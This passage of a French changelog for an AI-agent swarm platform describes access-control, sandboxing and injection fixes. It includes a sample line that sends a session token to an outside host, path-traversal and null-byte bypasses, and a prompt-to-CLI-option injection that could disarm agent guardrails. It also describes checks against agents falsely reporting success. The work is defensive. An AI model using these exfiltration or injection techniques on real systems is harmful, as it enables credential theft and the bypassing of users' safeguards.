  de lien lit, il ne fabrique pas de travail pour l'essaim d'autrui — et le
  bouton ne lui est même pas proposé. Éprouvé de bout en bout dans un navigateur
  **sans compte ni jeton de ruche** : avancement visible, code lisible, `.env`
  absent, aucun nœud nommé, aucune retouche possible (401), puis lien révoqué →
  refus indistinguable de l'inexistence.

- **👥 Adopter un projet, y admettre des ouvrières** (règles pures
  `peutAdopter` / `peutAdmettre` dans `src/shared/acces-projet.ts`, routes
  `POST /api/projects/:id/adopter` et `…/membres` en POST et DELETE, panneau
  « Équipe » dans la vue Projets). Un
  projet privé n'avait **aucun moyen de gagner un membre** : `POST /join`
  n'admet, sur un projet privé, que le propriétaire, l'administrateur et ceux
  qui sont déjà membres — ce qui est correct (on ne s'invite pas chez les
  autres) et incomplet, puisqu'il n'existait aucune route pour INVITER. Un
  dépôt importé de GitHub cumulait les deux : privé **et** sans propriétaire,
  l'import s'authentifiant par le jeton de ruche, qui n'est le compte de
  personne. On connectait son dépôt, et aucune de ses abeilles ne le voyait —
  l'exact contraire de ce pour quoi Le Rayon a été construit. Chaque route se
  comportait pourtant comme son test le demandait : le défaut n'était dans
  aucune, il était dans ce qu'**aucune ne faisait**. Deux règles tiennent le
  reste : **adopter n'est jamais prendre** (un projet qui a déjà un
  propriétaire ne change pas de mains, même pour un administrateur — il peut
  déjà tout LIRE, s'approprier est un autre acte ; la condition « pas encore de
  propriétaire » vit DANS l'instruction d'écriture, donc deux adoptions ne
  peuvent pas réussir toutes les deux) et **admettre est le droit du
  propriétaire, pas d'un membre** (sinon le premier invité invite à son tour,
  et « privé » ne veut plus rien dire au bout de trois personnes). L'admission
  se fait par **identifiant de compte, jamais par courriel** : le courriel
  ferait de cette route un oracle « ce courriel a-t-il un compte ici ? »
  interrogeable par tout propriétaire de projet, alors que l'inscription a été
  durcie exprès pour ne pas répondre à cette question. L'écran montre donc à
  chacun son propre identifiant, à donner comme on se passe un billet. Le
  refus garde la forme exacte de l'inexistence, vérifiée à l'octet près.

- **🐝 Le polyéthisme a un écran** (carte dans la vue Essaim).
  `/api/polyethisme` calculait des castes que personne ne voyait, ce qui
  revient à ne pas les calculer. Le Waggle Board classe par volume, les
  phéromones par affinité ; ni l'un ni l'autre ne répond à « à qui puis-je
  confier quoi ». La carte affiche les **deux modes** — celui qu'on a réglé et
  celui qui s'applique — parce que sans Gardiennes le polyéthisme s'éteint de
  lui-même, et que cet écart est le fait le plus utile de l'écran. Chaque ligne
  dit ce qui **manque** pour monter d'un palier : « nourrice » n'est pas un
  reproche, c'est l'état d'un nœud **non observé**, donc de tout nouvel
  arrivant.

- **📦 L'environnement — l'agent installe ce dont il a besoin** (module pur
  `src/shared/preparation.ts`, champ `prepareCommand` sur
  `POST /api/projects/:id/merge/run`). `npm test` sur un clone frais échoue
  faute de `node_modules` : le verdict qui remontait disait « tests en échec »
  là où il fallait lire « environnement absent », et l'hôte partait chercher une
  régression dans du code qui allait très bien. **La préparation installe ce que
  le DÉPÔT déclare, jamais ce que la COMMANDE nomme** — `npm ci` lit le
  `package-lock.json` du dépôt, `npm install lodash` laisse le hub décider de ce
  qui s'exécute sur la machine d'un membre. La frontière de confiance de la
  ruche est le dépôt que l'hôte a choisi de connecter, et elle le reste. Trois
  refus, chacun fermant un chemin distinct : **binaire** hors liste (`sh`,
  `curl`, `make`), **sous-commande** hors liste (`npm run deploy` est du code
  arbitraire déguisé en installation), et **argument positionnel** — c'est lui
  qui nomme un paquet. S'y ajoutent les drapeaux qui déplacent la **source**
  (`--index-url`, `--registry`, `--userconfig`…) : respecter la lettre de la
  règle en laissant un tiers fournir les paquets en trahirait l'esprit. Ce que
  ça ne protège pas, et il faut le dire : `npm ci` exécute les `postinstall` du
  dépôt, donc qui contrôle le dépôt exécute du code sur la machine du membre,
  exactement comme avec `npm test`. **L'ordre est la partie qui ne se voit
  pas** : la préparation tourne avant les tests (sinon elle ne sert à rien), le
  diff cumulé est calculé avant elle (sinon `node_modules` finit sous les yeux
  de l'humain qui relit), et une **préparation en échec n'est pas un test
  rouge** — les tests ne sont pas lancés, `preparedOk` le dit séparément de
  `testsPassed`, et l'écran comme la CLI affichent « environnement non préparé »
  au lieu d'un verdict trompeur. Garde posée **aux trois bouts** (hub en 400
  avant le choix du nœud, nœud avant de cloner, `runMerge` avant la moindre
  écriture) et enveloppée par le bac à sable, comme le reste. Éprouvé hors ligne
  sur un vrai `npm ci` : dépôt à lockfile vide, script `prepare` déposant un
  témoin que la commande de test cherche — c'est ainsi qu'on observe l'ordre au
  lieu de le supposer.

- **✏️ L'éditeur de la Reine — une retouche devient une TÂCHE** (module pur
  `src/shared/retouche.ts`, route `POST /api/projects/:id/rayon/retouche`).
  Le miroir du Rayon est une **copie jetable** : y écrire donnerait l'illusion
  d'avoir corrigé quelque chose, jusqu'au prochain rafraîchissement qui
  effacerait tout en silence. Une modification à l'écran fabrique donc une tâche
  — titre, prompt, contenu du fichier enveloppé dans le bloc de données non
  fiables — qui passe par la revue comme n'importe quelle production. Le bouton
  dit « **Proposer** », jamais « Enregistrer » : le mot promet ce que le système
  fait. Réservé au propriétaire du projet (et aux administrateurs) ; **un
  porteur de lien de partage lit, il ne fabrique pas de travail** pour l'essaim
  de quelqu'un d'autre — sans cette distinction, un lien envoyé « juste pour
  montrer » deviendrait un droit de faire tourner des agents sur les machines
  des membres.

- **👁 L'Aperçu — voir ce que l'IA construit, sans lui donner la session**
  (module pur `src/shared/apercu.ts`, route
  `GET /api/projects/:id/apercu`). Prévisualiser un site que l'agent vient
  d'écrire, c'est **exécuter dans le navigateur de l'hôte** du HTML et du
  JavaScript que personne n'a relus. Servi en même origine que le tableau de
  bord, `fetch('https://ailleurs/', {body: localStorage['hive.jwt']})` suffirait
  à donner la ruche. Quatre murs, et le premier est celui qui compte : **origine
  opaque** (`<iframe sandbox="allow-scripts">` **sans `allow-same-origin`** — le
  cadre ne lit ni le `localStorage` ni les cookies) ; **aucun identifiant ne
  circule** (le document est assemblé côté hôte et injecté par `srcdoc`, le
  cadre n'appelle jamais la ruche) ; **réseau coupé** par une
  `Content-Security-Policy` en tête de document (`default-src 'none'`,
  `connect-src 'none'`, `form-action 'none'`) ; **aucune navigation** (ni
  `allow-top-navigation`, ni `allow-popups`, ni `allow-forms` — un aperçu qui
  peut remplacer la page par une fausse mire de connexion est un hameçonnage
  servi depuis le domaine de confiance de l'utilisateur). Le site est replié en
  **un document auto-suffisant** — feuilles et scripts recopiés à l'intérieur,
  puisqu'une origine opaque sans réseau ne peut rien charger — avec les
  fermetures de balise échappées (`</script>` dans un fichier JS est
  l'échappatoire classique de l'inlining) et la règle de chemins du Rayon
  réutilisée, pour que `../../.env` ne devienne pas une feuille de style parce
  qu'il est écrit dans un `href`. Éprouvé sur un site **hostile** tentant
  exactement ce qu'un attaquant tenterait : `localStorage=BLOQUÉ`,
  `origine=null`, `parent=BLOQUÉ`, `Failed to fetch` — pendant que la page
  s'affichait normalement, CSS repliée comprise.

- **🔗 Le partage en lecture — montrer un projet sans donner la ruche** (module
  pur `src/shared/partage.ts`, table latérale `partages`, routes
  `POST/GET/DELETE /api/projects/:id/partages`). Le jeton de partage n'est
  **pas** le jeton de ruche : préfixe `hive3_` distinct, **deux actes
  seulement** (voir l'avancement, lire le code), valable pour **un** projet,
  expirable (7 jours par défaut, 90 au plus) et **révocable un par un** sans
  toucher aux autres — là où révoquer `HIVE_TOKEN` déconnecte tout l'essaim. Le
  jugement énonce ses refus dans l'ordre qui renseigne le moins un curieux
  (révoqué avant expiré avant mauvais projet), et le décodage exige la **forme
  canonique** : base64url étant tolérant, `hive3_XXXX` et `hive3_XXXXy`
  décodaient à l'identique — un identifiant qui s'écrit d'une infinité de façons
  casse tout ce qui compte des chaînes de caractères.

- **🍯 Le Rayon — les abeilles voient enfin le code** (module pur
  `src/shared/rayon.ts`, miroir `src/orchestrator/miroir.ts`, routes
  `GET /api/projects/:id/rayon` et `.../rayon/fichier`). Ce que les membres
  voyaient jusqu'ici, c'étaient des **tâches** : des titres, des états, des
  diffs. Jamais le code. On travaillait sur un projet sans pouvoir l'ouvrir —
  comme aider à réparer un moteur sans avoir le droit de soulever le capot.
  **Le hub tient désormais son propre miroir**, un clone superficiel en lecture
  seule par projet (`data/rayons/<id>`), rafraîchi au plus une fois par minute
  et déduplique les rafraîchissements concurrents — deux `git` dans le même
  répertoire ne donnent pas deux dépôts à jour, ils donnent un dépôt corrompu.
  Le choix du miroir plutôt que de l'API GitHub est délibéré : l'API exigerait
  le **jeton de l'hôte** (montrer le code à une abeille dépenserait pour elle
  un droit qui n'est pas le sien), ne marcherait que sur GitHub, et son quota
  s'épuiserait à trois personnes parcourant un arbre de fichiers. **Deux gardes
  indépendantes, et les deux doivent passer** : `peutLireCode` (public = tout
  compte, privé = membres et propriétaire, refus **indistinguable de
  l'inexistence**) et la liste de ce qui ne se sert jamais — **`.git` en
  premier**, puisqu'il contient `config`, donc l'URL distante, donc les
  identifiants du dépôt privé ; puis les `.env`, `.npmrc`, `id_rsa` et les
  extensions de clés. Sans la seconde, un membre parfaitement légitime repartait
  avec le jeton GitHub de l'hôte. Sept contournements sont fermés **nommément,
  chacun avec son test** : `..` mêlé à des segments valides, séparateurs
  Windows, chemins absolus (POSIX, lettre de lecteur, UNC), **octet nul**
  (`fichier.txt\0.png` — les couches C tronquent là où JavaScript ne le fait
  pas, donc ce qui est ouvert n'est pas ce qui a été vérifié), **liens
  symboliques** (éprouvés sur de vrais liens vers `/etc` dans un vrai dépôt —
  aucune règle pure ne peut les voir, seul le disque sait où ils mènent), et
  **le bug de préfixe** : `'/srv/rayon-mechant'.startsWith('/srv/rayon')` est
  vrai, et c'est l'erreur qu'on introduit précisément en croyant refermer la
  faille. Binaires refusés plutôt que déversés dans un éditeur, fichiers bornés
  à 512 Ko, tri « dossiers d'abord » avec `localeCompare` français — trier à
  l'octet mettrait `Élan` en toute fin d'une liste qu'on ne pourrait plus
  parcourir.

- **🛂 Les Gardiennes — le contrôle d'entrée du nectar** (module pur
  `src/orchestrator/gardiennes.ts`). Jusqu'ici la ruche croyait l'agent sur
  parole : un `success: true` accompagné d'un **diff vide** fabriquait un
  souvenir Hive Mind (pollution définitive de la mémoire collective), déposait
  une phéromone **positive** sur le couple nœud × domaine, créditait du
  **nectar** au Waggle Board et comptait en **`utile`** dans La Balance — un
  mensonge comptable qui empirait de jour en jour. Les Gardiennes inspectent
  chaque production déclarée réussie et rendent des **griefs typés** :
  `empty_diff` (diff vide sur une promesse de modification), `surface_missed`
  (aucun des fichiers annoncés n'est touché — comparaison **normalisée en
  casse**, `extractPaths` rendant des chemins en minuscules là où `parseDiff`
  garde la casse d'origine), `malformed_diff` (texte qui ne nomme aucun fichier,
  ou hunks orphelins) et `logs_contradict` (logs qui crient l'échec sur des
  motifs **étroits**, distincts de ceux de la Couveuse — « 0 errors » n'accuse
  personne). Interrupteur `HIVE_GARDIENNES=off|consultatif|strict`, **défaut
  `consultatif`** : on observe et on annote longtemps avant de contraindre — en
  `consultatif`, la séquence d'événements est **rigoureusement identique** à
  celle d'avant (prouvé par le harnais de rejeu partagé). En `strict`, une
  production creuse emprunte le circuit d'échec existant : elle ne nourrit ni le
  Hive Mind, ni les phéromones, ni le nectar, ni `utile`, et la tâche **re-tente
  sur le budget `MAX_ATTEMPTS` existant** — jamais sur un compteur à part, donc
  jamais sans fin. Le verdict est calculé **à la réception** et rangé aussitôt
  dans une **table neuve** `gardiennes` (`CREATE TABLE IF NOT EXISTS`, aucun
  `ALTER TABLE`, aucun index existant modifié) avec sa **borne d'élagage**
  `pruneGardiennes` dans le même commit : `pruneResults` vide `diff` et `logs`
  au-delà de 5 000 résultats, donc un verdict recalculé après coup serait faux.
  `GET /api/gardiennes` (vue dérivée pure et bornée), événement `guard_refused`
  (faits typés, codes en anglais snake_case).
- **🐜 Phéromones — routage par affinité apprise** (module pur
  `src/orchestrator/pheromones.ts`). Chaque résultat dépose une phéromone
  (+10 succès, −6 échec) sur le couple **nœud × domaine** de tâche (api, ui,
  db, tests, docs, infra, general — heuristique bilingue en mots entiers) ;
  le signal s'évapore avec une **demi-vie de 7 jours**. À l'assignation, le
  critère « nœud le moins chargé » reste souverain : les phéromones ne
  **départagent** que les ex æquo à charge minimale, et seulement sur un
  signal net. `GET /api/pheromones`, événement `pheromone_route`, carte
  dédiée dans la vue Essaim.
- **🌡️ Thermorégulation — la ruche ventile quand elle surchauffe** (module
  pur `src/orchestrator/thermo.ts`). Température 0-100 sur une fenêtre de
  10 min (échecs ×1, re-tentatives ×0,6, refus infra ×0,8 ; les échecs en
  **cascade** ne comptent pas, ce sont des conséquences, pas des symptômes).
  Bandes froide/normale/chaude/surchauffe → concurrence effective par nœud
  ×1 / ×1 / ×0,75 / ×0,5, jamais moins d'une tâche. **Hystérésis** par ticks
  consécutifs hors bande : pas de clignotement aux frontières.
  `GET /api/thermo` (`{ instantane, applique }`), événement `thermo_shift`,
  jauge dans la vue Santé qui montre la divergence lecture/appliqué.
- **👶 Couveuse — les re-tentatives apprennent de leurs échecs** (module pur
  `src/orchestrator/brood.ts`). À la ré-assignation d'une tâche déjà échouée,
  les logs des tentatives précédentes sont repliés en leçons (lignes d'erreur
  privilégiées, ANSI nettoyé) et injectées en tête du `hiveContext`, dans un
  **bloc de données isolé des instructions** (`<<<HIVE_DATA`, une ligne JSON
  par tentative, délimiteur neutralisé) — un agent hostile ne peut pas
  transformer ses logs en ordres pour l'ouvrière suivante. Budget borné de
  bout en bout (≤ 8000 au total, la limite au-delà de laquelle le nœud rejette
  l'assignation). Événement `brood_context`.
- **🌐 Site vitrine** — landing page bilingue FR/EN dans `site/` (design
  « ruche » : Swarm View animée en SVG, journal vivant, 8 fonctionnalités,
  architecture hub-and-spoke, sécurité, démarrage, roadmap), auto-déployée
  sur GitHub Pages par `.github/workflows/pages.yml` à chaque push sur
  `main`. SEO complet (Open Graph, Twitter Card, JSON-LD, sitemap), image
  de partage `og.png`, accessibilité (skip-link, `aria-pressed`,
  `prefers-reduced-motion`), langue mémorisée (`?lang=`, localStorage,
  langue du navigateur) et compteur d'étoiles GitHub en amélioration
  progressive.

- **Revues partagées** — les verdicts de la Miellerie vivent côté serveur
  (`POST /api/tasks/:id/review`, `GET /api/reviews`, événement `task_reviewed`) :
  tous les opérateurs voient les mêmes approbations en temps réel ;
  localStorage ne sert plus que de repli hors-ligne.
- **Merge sélectif** — `POST /merge/run` accepte `taskIds` (validés : tâches
  terminées du projet) ; « Couler le miel » depuis la Miellerie n'intègre que
  les productions **approuvées**.
- **⚔ Drone Wars câblé** — redondance compétitive opt-in : `POST
/api/tasks/:id/race { factor }` (CLI `race`, bouton du tiroir de tâche)
  confie la même tâche prête à 2-5 nœuds (diversité d'agents maximisée) ;
  le premier succès gagne, les perdants reçoivent `cancel_task`. Primaire
  promu si un drone tombe ; échecs/refus/déconnexions absorbés par la
  course (une seule tentative brûlée au pire). Courses en mémoire —
  un redémarrage du hub retombe sur le circuit mono-nœud, sans double
  exécution.
- **🌍 Interface bilingue fr/en** — bascule FR/EN dans la topbar, détection
  de la langue du navigateur, 24 fichiers traduits (glossaire ruche : forage,
  honeycomb, pour the honey, the Honey House…). La Reine répondait déjà dans
  la langue du message.
- **Revues multi-opérateurs durcies** — compare-and-set opt-in
  (`expectedUpdatedAt`, 409 avec l'état courant), horodatages exposés par
  `GET /api/reviews`, identité d'onglet (`clientId`) échouée dans
  `task_reviewed` : les échos propres sont reconnus formellement.
- **La Reine parle revue** — nouvelle intention `review` : « que reste-t-il à
  revoir ? » répond avec les compteurs réels (approuvées/rejetées/en attente)
  et les prochaines productions à inspecter.
- **⚔ Le nectar des vainqueurs** — le Waggle Board crédite un bonus de
  5 nectars par victoire de course (`drone_won`, en plus du `task_done` du
  vainqueur) ; perdre ou être annulé en course reste neutre (redondance
  opt-in, pas de double peine). Victoires affichées dans l'Essaim et la CLI.
- **Courses visibles** — `GET /api/races` expose les courses en vol ; les
  cartes de nœuds de l'Essaim portent un badge ⚔ animé quand un de leurs
  drones vole encore, et une carte « Courses en vol » liste tâche + drones
  (noms et statuts). Après la course, le tiroir de tâche affiche le
  vainqueur 🏆 (retrouvé au journal via `drone_won`).
- **La Reine parle courses** — nouvelle intention `races` fr/en (« y a-t-il
  des courses en vol ? ») : courses réelles avec drones nommés et statuts,
  ou mode d'emploi pour en lancer une ; courses exposées au mode IA. Le suivi
  est complet : CLI `races`, badge ⚔ Essaim, famille « Courses » en Chronique,
  démo avec course automatique.
- **Night Shift câblé** — `HIVE_SHIFT` agit vraiment : hors des heures de
  service du membre, le nœud refuse poliment tâches ET merges (aucune
  tentative brûlée, `retryAfterMs` évite la re-sollicitation en boucle,
  config malformée = refus propre). Le heartbeat déclare `onShift` : la
  sélection de merge évite d'office les nœuds hors service. Documenté dans
  `.env.example`.

- **🐝 L'accueil — le premier écran devient une fonctionnalité** (lots 1 et 2 de
  `MISSION-ACCUEIL.md`). `npm run install:hive` affichait une liste : on ne
  choisissait rien, on subissait. Il pose maintenant la seule question qui
  compte — **ouvrir sa propre ruche, rejoindre une ruche, ou installer sur un
  serveur** — et, surtout, **RIEN N'EST ÉCRIT AVANT UN RÉCAPITULATIF** qui
  nomme les fichiers touchés. Un installeur qu'on n'ose pas lancer n'installe
  rien ; celui-ci dit ce qu'il va faire avant de le faire, et sur un `.env`
  **existant** il demande confirmation avec « ne rien changer » pour défaut.
  Deux modules, sur la ligne de partage habituelle du dépôt :
  `src/tui/rendu.ts` est **pur** — `(état) => string[]`, aucune I/O, aucune
  dépendance ajoutée (le TUI est écrit à la main, voir `docs/adr/0006`) — et
  `src/tui/terminal.ts` porte les effets : mode brut, flèches, `^C`, et **la
  restauration en `finally`**. Cette dernière est la propriété qui compte : un
  installeur qui laisse un terminal en mode brut oblige quelqu'un à taper
  `reset` à l'aveugle dans un shell devenu muet. Les **cinq dégradations** sont
  testées sans terminal (non-TTY, `NO_COLOR`, `TERM=dumb`, moins de 60
  colonnes, 200 colonnes), dont la garde qui les résume : **aucun octet `\x1b`
  n'est émis quand la couleur est coupée**, vérifié sur une page entière. Repli
  **16 couleurs** quand rien n'annonce la palette 256 — ConHost, la console
  Windows historique, rend le texte illisible et non « approximatif ». Le
  curseur du menu ne repose **pas** sur la seule couleur. Les **codes de sortie
  deviennent un contrat** (`src/codes-sortie.ts`, §9 de la mission) : `2`
  prérequis manquant — c'était `1` —, `3` réponse absente en mode non
  interactif, `130` interruption (`128 + SIGINT`, pour qu'un `^C` ne se
  confonde pas avec un échec et ne déclenche pas une reprise automatique).
  Hors terminal, **rien n'est deviné** : soit un défaut documenté, soit une
  erreur nommée. `npm run setup` reste donc scriptable et idempotent.
  `docs/adr/` (nouveau) porte les six décisions de cadrage.

- **L'installeur devient scriptable** (lot 4). `src/args.ts` — un analyseur
  **pur** — remplace les trois mini-analyseurs ad hoc du dépôt, dont **aucun**
  ne gérait `--drapeau=valeur` : écrire `--uses=3` ne provoquait pas d'erreur,
  le drapeau était simplement **ignoré** et la commande tournait avec le
  défaut. Désormais les deux écritures marchent, et **un drapeau inconnu est
  une erreur** qui liste ce qui existe — jamais un silence : quelqu'un qui
  tape `--dry-runn`, croit simuler et écrit pour de bon a été trahi par son
  outil. `--dry-run` montre sans écrire, `--yes` saute les confirmations,
  `--non-interactive` (implicite si `CI` est posée) ne pose aucune question,
  `--json` rend un objet analysable par `jq` (Node, port, agent, isolement,
  action sur le `.env`, code de sortie) et supprime toute prose.
  **Le `.env` est désormais COMPLÉTÉ, plus régénéré** : `completerEnv` ajoute
  les clés manquantes en fin de fichier avec leur explication et ne touche à
  rien d'autre. Les valeurs étaient déjà préservées, mais l'ordre, les
  commentaires et la mise en forme de l'humain étaient remplacés par les
  nôtres — donc l'idempotence octet pour octet exigée au §12 de la mission
  était **fausse**. Elle est vraie, et testée. L'écriture est **atomique**
  (temporaire + `rename`) : un `^C` au mauvais moment ne laisse plus un `.env`
  tronqué, c'est-à-dire un jeton coupé en deux et une ruche qui refuse de
  démarrer sans dire pourquoi. Un port occupé pose le code `4` sans rien
  annuler.

- **🤝 Rejoindre une ruche en UNE commande, sans rien cloner** — `218 Mo et
279 paquets` deviennent **4 Mo et 9 paquets**. Prêter du temps-machine à un
  ami demandait un `git clone` puis un `npm install` complet : un moteur 3D de
  27 Mo, React, six paquets d'éditeur de code — pour un dashboard qu'un nœud
  membre **n'ouvre jamais**. La cartographie des imports depuis `join.ts` et
  `main.ts` a montré qu'un nœud n'atteint à l'exécution que **deux** paquets,
  `ws` et `simple-git` ; les douze paquets de navigateur (bundlés par Vite)
  passent en `devDependencies`, et les quatre de l'orchestrateur (Fastify,
  SQLite) en `optionalDependencies`. Un `bin` (`src/bin.ts`) et une **chaîne de
  compilation** (`tsconfig.build.json` → `dist/`, qui n'existait pas : tout
  tournait par `tsx` depuis les sources) rendent la commande installable :
  `npx github:Micka420-collab/hive join hive2_…`, ou
  `npm i -g … --omit=optional` pour n'installer strictement rien de superflu.
  Une dépendance optionnelle absente n'est plus un `ERR_MODULE_NOT_FOUND` brut :
  l'orchestrateur la **nomme** et donne la commande qui répare. Deux défauts
  corrigés au passage — `hive join` sans billet et sans terminal **attendait
  indéfiniment** au lieu de sortir en code 3, et `dist/` n'était ignoré ni par
  ESLint, ni par Prettier, ni par git.

### Security

- **Le billet d'un serveur provisionné était rangé EN CLAIR dans
  `serveurs.motif`.** Les instructions du fournisseur manuel contiennent le
  billet de rattachement — c'est leur raison d'être, l'humain doit pouvoir
  coller la commande — et elles étaient persistées telles quelles comme motif
  de transition. Or **un billet porte le secret en clair** : `hive2_…` est un
  base64url lisible, pas un chiffrement. Toute la précaution prise à côté était
  donc annulée par cette ligne : la table `billets` ne range qu'une **empreinte
  PBKDF2** (`secretHash`), pendant que le secret dormait en clair juste à côté
  dans `serveurs`, durablement, exporté par `GET /api/admin/serveurs`, et sans
  aucune borne liée à la péremption du billet — un billet à usage unique
  consommé il y a trois mois y était encore lisible. `motif` est un champ
  d'**état** : personne ne s'attend à y trouver un identifiant, il s'affiche
  dans une page d'administration, se copie dans un fil de support, se lit dans
  une sauvegarde. Ce qui est rangé est désormais **caviardé**
  (`caviarderBillet`, module pur — le reste des instructions survit, sinon
  l'administrateur ne saurait plus quoi faire), et le billet est remis par
  `GET /api/admin/serveurs/:id/billet`, **une seule fois, depuis la mémoire**,
  sous le droit `gerer_serveurs`. Vivre en mémoire signifie qu'un redémarrage
  le perd : c'est la bonne propriété pour un secret à usage unique, et le code
  le disait déjà — « un billet perdu ne se retrouve pas, il se remplace ». Un
  test existant **affirmait la fuite comme si c'était une fonctionnalité**
  (il vérifiait que `motif` contenait `npm run join hive2_…`) ; il vérifie
  maintenant le contraire.

- **Le hub analysait 2 Mo de JSON pour un inconnu, avant de savoir qui il
  était.** `maxPayload` du serveur WebSocket vaut 2 Mo, et c'est la bonne
  valeur pour un nœud **authentifié** : il remonte des diffs. C'était la
  mauvaise pour un inconnu. `parseClientMessage(data.toString())` — une
  conversion en chaîne **puis** un `JSON.parse` sur 2 Mo — s'exécutait avant la
  moindre vérification d'identité. Avec le budget existant de 100 messages par
  seconde et par socket, sur les 5 s de la fenêtre d'authentification, cela
  faisait **1 Go à analyser par connexion**, sans aucun identifiant et sans
  borne sur le nombre de connexions. Un message d'authentification tient dans
  quelques centaines d'octets : au-dessus de 8 Ko avant authentification, la
  socket est fermée. Le code de fermeture est **4413** (écho du 413 HTTP) et
  **non 4400** — sans cette distinction, ni un test ni un opérateur qui débogue
  ne peuvent dire si le hub a refusé la forme du message ou sa taille ; le test
  s'en est aperçu le premier. La mesure (`octetsDe`) compte aussi les **trames
  fragmentées** (`Buffer[]`) : n'en regarder que le premier morceau aurait
  laissé passer, par la fragmentation, exactement ce qu'on borne — et
  l'attaquant choisit sa fragmentation.

- **`/api/auth/register` rendait gratuitement l'annuaire que `/api/auth/login`
  se donne tant de mal à cacher.** `login` répond exactement la même chose que
  le compte existe ou non — son commentaire dit pourquoi : « distinguer les
  deux offrirait un annuaire des inscrits ». `register`, lui, répondait **409
  « Email déjà utilisé »**, et sous la seule limite globale (400 requêtes /
  10 s) cela faisait **2 400 adresses testées par minute et par IP**. Le soin
  pris sur `login` ne servait donc à rien : il suffisait de frapper à l'autre
  porte. Un compteur dédié par IP compte désormais les **collisions
  d'adresse** — jamais les inscriptions réussies, même raisonnement que pour
  `joinEchec` : un atelier de dix personnes derrière une seule IP publique (le
  NAT d'un bureau, d'une école) doit pouvoir créer dix comptes, et un test le
  vérifie. Au-delà de 5 collisions par tranche de 10 minutes, l'IP reçoit un
  429 avec `retry-after` **y compris sur une adresse libre** — sinon le 429
  deviendrait lui-même l'oracle (« 429 = prise, 200 = libre »), ce que teste
  explicitement le fichier. **Ce que ce correctif ne ferme pas, et il faut le
  dire :** le 409 subsiste, parce que sans lui personne ne comprendrait
  pourquoi son inscription échoue — une énumération _lente_ reste donc
  possible. La fermer tout à fait demanderait de confirmer l'adresse par
  courriel avant de répondre quoi que ce soit ; la ruche n'envoie aucun
  courriel, et prétendre le contraire serait pire que le trou.

- **N'importe quel compte pouvait s'ajouter à n'importe quel projet, privé
  compris** (module pur `src/shared/acces-projet.ts`).
  `POST /api/projects/:id/join` ne vérifiait qu'une seule chose : que
  l'appelant soit authentifié. Ni la visibilité du projet, ni son propriétaire,
  ni la moindre invitation. `GET /api/projects/:id/members` avait exactement le
  même trou : la liste **nominative** des membres d'un projet privé était
  lisible par tout titulaire d'un compte — **créer un compte suffisait à
  énumérer qui travaille sur quoi**. La colonne `visibility` et le champ
  `ownerId` existaient pourtant depuis le début : c'est le cas d'école du
  contrôle d'accès qui vit dans le modèle de données et jamais dans le chemin
  d'exécution. Un projet public reste ouvert — c'est ce que le mot veut dire,
  et le catalogue le montre déjà à des inconnus ; un projet privé ne s'ouvre
  plus tout seul. **Le refus prend la forme exacte de l'inexistence, à l'octet
  près** : un « 403 interdit » confirmerait que le projet existe, et répété sur
  une liste d'identifiants il dessinerait la carte des projets de la ruche —
  or les identifiants voyagent (une URL collée dans un salon, un journal, un
  signet). Même raisonnement que pour les billets (ADR 0005), et un test
  compare les deux réponses caractère par caractère. Le motif, lui, part au
  journal (`project_join_refused`) : ce que l'appelant ne voit pas, le
  propriétaire de la ruche le voit. La question « est-elle membre ? » est
  posée en base de façon fermée (`estMembre`) plutôt qu'en chargeant la liste
  complète, qui nomme d'autres gens pour répondre sur un seul compte.

- **La commande de test d'un merge passe enfin par le bac à sable** — et un
  test tient désormais la liste de ce qui doit y passer
  (`tests/isolement-couverture.test.ts`). `exec.ts` portait ce commentaire :
  « c'est le **seul** endroit où un agent est lancé, donc le seul endroit où
  l'oubli serait total ». Il était faux, et le croire a coûté cher :
  `merge-runner.ts` lançait la commande de test avec son propre `spawn`, sans
  enveloppe. Autrement dit `HIVE_ISOLEMENT=exige` — le réglage qu'on pose
  précisément quand on prête sa machine à des inconnus — empêchait bien un
  agent de sortir de son bac **pendant que les tests d'un merge tournaient à
  côté, sur l'hôte nu, avec le `HOME` du membre**. Le bac du nœud suit
  maintenant le merge (le clone est le seul volume monté, racine en lecture
  seule, `cap-drop=ALL`, secrets transmis **par leur nom**), et un test
  behavioural le prouve sans docker, à l'aide d'un faux moteur qui imprime son
  argv — il vérifie aussi qu'aucun `--env=CLE=valeur` n'apparaît, ce qui
  écrirait le secret dans la table des processus. Le test de couverture, lui,
  énumère les `spawn` du dépôt et exige pour chacun soit une enveloppe, soit
  une **dérogation nommée avec sa raison** (détection d'agents, sonde de moteur
  de conteneurs, tunnel cloudflared) ; une dérogation orpheline est refusée
  elle aussi. Un commentaire ne vérifiait rien — et n'a rien vérifié.

- **Le prompt d'une tâche ne peut plus devenir une option de l'agent** (module
  `src/adapters/prompt-argv.ts`). L'adaptateur claude-code lançait
  `claude -p <prompt> --output-format stream-json --verbose` : un prompt
  commençant par un tiret n'était alors plus un prompt, mais une option.
  **Vérifié sur le binaire réel** — `claude -p '--version' …` imprimait
  `2.1.220 (Claude Code)` et sortait, sans jamais voir de prompt ; avec `--`
  posé au bon endroit, la même chaîne redevient du texte et la session démarre.
  Ce n'est **pas** « de l'exécution de code là où il n'y en avait pas » — un
  nœud accepte déjà d'exécuter l'agent sur des prompts venus du hub, et le dire
  serait exagérer. Ce que l'injection ajoutait, c'est le contrôle des
  **options** de l'agent, donc de quoi désarmer les garde-fous que le membre a
  posés sur **sa** machine (permissions, répertoires autorisés, configuration
  MCP) : il croyait prêter un agent bridé, il prêtait l'agent que le hub
  configure. Et le prompt n'est pas toujours écrit par un humain — le
  planificateur, la Reine et le runner d'essaim en fabriquent, il suffit qu'un
  modèle produise une ligne qui commence par un tiret. `claude` et `codex`
  posent désormais le terminateur POSIX `--` devant le prompt (options
  d'abord) ; l'adaptateur `custom`, dont la commande appartient à l'opérateur
  et peut ne pas comprendre `--`, neutralise le **texte** au lieu de la
  commande — un prompt qui commence par un tiret reçoit une espace de tête,
  invisible pour du langage naturel et impossible à lire comme une option.
  **Une liste Markdown (« - corriger le bug ») reste donc parfaitement
  légitime** : c'est le cas qu'un simple refus aurait cassé.

- **La route anonyme `GET /api/projects/public` ne publie plus la ligne entière
  de la base** (module `src/shared/projet-public.ts`). C'est la seule route de
  la ruche qui ne demande aucune authentification — c'est voulu, c'est un
  catalogue — et elle renvoyait `SELECT * FROM projects`. Deux colonnes n'y
  avaient rien à faire : **`repoUrl`**, alors qu'un dépôt privé se clone en
  écrivant ses identifiants dans l'URL
  (`https://user:ghp_…@github.com/org/depot.git`, que `isValidRepoUrl`
  acceptait sans rien dire) — un jeton GitHub partait donc à quiconque savait
  faire un `curl` — et **`ownerId`**, qui désigne une cible nommée sans rien
